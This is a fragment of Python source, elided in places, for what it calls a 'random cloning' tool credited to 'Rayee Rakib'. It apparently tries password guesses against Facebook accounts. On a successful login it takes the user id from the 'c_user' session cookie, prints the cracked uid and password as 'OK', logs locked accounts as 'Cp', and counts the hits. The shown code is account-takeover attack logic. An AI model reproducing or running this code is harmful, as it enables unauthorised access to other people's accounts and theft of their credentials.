...
import zlib
import base64
os.system('espeak -a 300 "WELCOME TO RAYEE RAKIB  RANDOM CLONING TOOLS"')
...
def freeq(uid,pwx,tl):
    ...
    'upgrade-insecure-requests': '1',
            ...
            if 'c_user' in log_cookies:
                ...
                uid = coki[151:166]
                print(f'\r\33[1;97m[\033[1;96mRAKIB -OK\033[1;97m]\033[1;92m '+uid+' | '+ps+  ' \n ')
                ...
                ok.append(uid)
                    ...
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    uid=coki[141:156]
                    print(f'\r\33[1;97m[\033[1;90mRAKIB -Cp\033[1;97m]\033[1;93m '+uid+' | '+ps+' ')
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r\33[1;35m[RAKIB ] [%s]  OK: %s CP: %s'%(loop,len(ok),len(cp))), 
        sys.stdout.flush()
    except:
        pass 
#---------------------[END MENU]---------------------#
